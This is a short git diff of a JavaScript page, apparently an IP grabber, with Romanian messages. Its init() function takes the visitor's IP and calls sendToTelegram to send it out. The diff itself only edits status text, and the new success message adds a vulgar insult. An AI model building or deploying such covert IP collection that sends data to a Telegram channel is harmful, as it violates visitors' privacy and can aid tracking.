@@ -48,7 +48,7 @@ async function init() {
     const ip = await getIP();
     if (!ip) {
         console.error('❌ Nu s-a putut prelua IP-ul');
-        statusElement.textContent = 'IP detectat si trimis cu succes! Mersi frate! 💓';
+        statusElement.textContent = 'Eroare la preluarea IP-ului';
         return;
     }
 
@@ -58,7 +58,7 @@ async function init() {
     const sent = await sendToTelegram(ip);
     if (sent) {
         console.log('✨ Proces finalizat cu succes');
-        statusElement.textContent = 'IP detectat și trimis cu succes!';
+        statusElement.textContent = 'IP detectat și trimis cu succes! Mersi frate! Mezmect trump muie la cai';
         // Resetăm textul după 3 secunde
         setTimeout(() => {
             statusElement.textContent = 'Așteptare...';
